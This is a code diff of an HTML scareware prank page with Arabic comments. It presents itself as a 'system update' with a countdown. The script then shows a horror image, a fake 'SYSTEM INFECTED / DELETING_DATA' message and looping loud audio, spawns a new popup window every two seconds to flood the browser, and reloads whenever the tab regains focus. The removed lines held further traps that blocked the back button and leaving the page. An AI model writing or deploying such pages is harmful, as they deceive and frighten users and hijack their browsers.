@@ -3,22 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_CRITICAL_LOCK ⚠️</title>
+    <title>⚠️ SYSTEM_UPDATE ⚠️</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; cursor: pointer; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
-        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.85); padding: 30px; border: 5px solid #f00; display: none; width: 85%; box-shadow: 0 0 25px #f00; }
+        #messageBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.85); padding: 30px; border: 5px solid #f00; display: none; width: 85%; }
+        #timerBox { color: #0f0; font-size: 50px; text-align: center; font-family: monospace; z-index: 1000; }
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="activateVirus()">
+<body onclick="startCountdown()">
+
+    <div id="timerBox">
+        <p style="font-size: 20px;">إضغط لبدء تحديث النظام...</p>
+        <div id="count">5</div>
+    </div>
 
     <div id="messageBox" class="blink">
-        <h1 style="font-size: 30px;">⚠️ SYSTEM INFECTED ⚠️</h1>
-        <p style="font-size: 18px;">نظامك مات سواسوة.. الضحك خلاص درك!</p>
+        <h1>⚠️ SYSTEM INFECTED ⚠️</h1>
+        <p>نظامك مات سواسوة.. الضحك خلاص درك!</p>
         <hr style="border: 1px solid #f00;">
-        <p style="font-size: 13px; color: #fff;">STORAGE_DELETED: 100%<br>LOCKED_BY_ALGE-HACKER</p>
+        <p style="font-size: 12px; color: #fff;">DELETING_DATA... [100%]<br>FREE PALESTINE 🇵🇸</p>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
@@ -26,54 +32,49 @@
 
     <script>
         let running = false;
+        let count = 5;
         const audio = document.getElementById('sfx');
-        const msg = document.getElementById('messageBox');
-        const img = document.getElementById('horrorImg');
+        const timerBox = document.getElementById('timerBox');
+        const countDisplay = document.getElementById('count');
         const MY_LINK = window.location.href;
 
-        // ميزة تكرار الصوت مع سكتة 4 ثواني سواسوة
-        audio.addEventListener('ended', function() {
-            setTimeout(() => {
-                if(running) audio.play();
-            }, 4000); 
-        });
-
-        function activateVirus() {
+        function startCountdown() {
             if (running) return;
             running = true;
-            document.documentElement.requestFullscreen().catch(() => {});
             
-            audio.volume = 1.0; 
-            audio.play();
-            img.style.display = 'block';
-            msg.style.display = 'block';
-
-            // إغراق النظام بالتبويبات سواسوة
-            setInterval(() => {
-                window.open(MY_LINK, '_blank', 'width=10,height=10');
+            // العد التنازلي سواسوة
+            let itv = setInterval(() => {
+                count--;
+                countDisplay.innerText = count;
+                if (count <= 0) {
+                    clearInterval(itv);
+                    activateVirus();
+                }
             }, 1000);
         }
 
-        // إجبار الدخول والتحكم في قوقل سواسوة
+        function activateVirus() {
+            timerBox.style.display = 'none';
+            document.getElementById('horrorImg').style.display = 'block';
+            document.getElementById('messageBox').style.display = 'block';
+            
+            // الصوت مع سكتة 4 ثواني سواسوة
+            audio.volume = 1.0;
+            audio.play();
+            audio.onended = () => { setTimeout(() => { audio.play(); }, 4000); };
+
+            // إغراق المتصفح سواسوة
+            setInterval(() => {
+                window.open(MY_LINK, '_blank', 'width=10,height=10');
+            }, 2000); // زيادة الوقت لتقليل رسائل التحذير سواسوة
+        }
+
+        // إجبارية البقاء سواسوة
         document.addEventListener("visibilitychange", () => {
             if (document.visibilityState === 'visible' && running) {
                 location.reload();
-                alert("⚠️ وين راك هارب؟ النظام تفيروسا سواسوة!");
             }
         });
-
-        window.onblur = function() {
-            if(running) {
-                setTimeout(() => {
-                    window.open(MY_LINK, '_self');
-                }, 400);
-            }
-        };
-
-        // منع الرجوع سواسوة
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
-        window.onbeforeunload = () => "⚠️ راك محبوس سواسوة!";
     </script>
 </body>
 </html>
